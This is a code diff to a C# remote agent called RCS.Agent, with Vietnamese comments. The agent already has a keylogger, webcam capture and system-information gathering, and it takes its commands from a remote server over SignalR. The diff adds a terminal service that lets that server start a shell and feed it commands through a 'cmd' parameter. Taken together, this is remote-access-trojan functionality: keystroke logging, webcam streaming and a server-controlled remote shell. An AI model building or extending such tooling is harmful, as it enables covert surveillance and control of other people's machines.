@@ -57,6 +57,7 @@ namespace RCS.Agent
         private static MediaCapture _mediaCapture;
         private static Keylogger _keylogger;
         private static SystemInfoManager _sysInfoManager; 
+        private static TerminalService _terminalService;
 
         // Biến phục vụ Streaming
         private static CancellationTokenSource _webcamCts; 
@@ -157,10 +158,15 @@ namespace RCS.Agent
             _keylogger = new Keylogger();
             _udpClient = new UdpClient();
             _sysInfoManager = new SystemInfoManager();
+            // ...
 
             // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
             _signalRClient = new SignalRClient(SERVER_URL_FINAL);
+
+            _terminalService = new TerminalService(_signalRClient); // Khởi tạo
+
             _signalRClient.OnCommandReceived += HandleCommand;
+
         }
 
         #endregion
@@ -255,6 +261,20 @@ namespace RCS.Agent
                         
                         Console.WriteLine("[Webcam] Force stopped.");
                         await SendResponse(cmd.Action, "stopped");
+                        break;
+
+
+                    // --- NHÓM LỆNH TERMINAL ---
+                    case ProtocolConstants.ActionTerminalStart:
+                        _terminalService.StartTerminal();
+                        break;
+                    case ProtocolConstants.ActionTerminalStop:
+                        _terminalService.StopTerminal();
+                        break;
+                    case ProtocolConstants.ActionTerminalInput:
+                        // Lấy lệnh từ tham số 'cmd' gửi xuống
+                        string inputCmd = GetParam(cmd, "cmd");
+                        _terminalService.WriteInput(inputCmd);
                         break;
                 }
             }
